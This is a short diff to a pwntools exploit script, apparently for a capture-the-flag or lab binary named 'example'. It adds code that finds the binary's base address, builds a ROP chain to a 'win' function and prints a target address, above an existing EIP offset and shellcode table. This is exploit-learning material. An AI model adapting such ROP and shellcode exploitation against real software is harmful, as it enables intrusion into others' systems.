@@ -39,6 +39,23 @@ import sys
 from pwn import *
 from itertools import cycle
 
+with process('./example') as p:
+    base_address = p.libs()['/app/example']
+    print(f"got {base_address=}={hex(base_address)}, {type(base_address)=}")
+
+elf = ELF("./example")
+print("elf address before", elf.address)
+elf.address = base_address
+print("elf address after", elf.address)
+
+rop = ROP(elf)
+print("rop address", rop.address)
+rop.win()
+
+goal = 0x565561ad
+print("goal = 0x565561ad")
+print(rop.dump())
+
 offset = 76 # eip offset
 
 shellcode = {
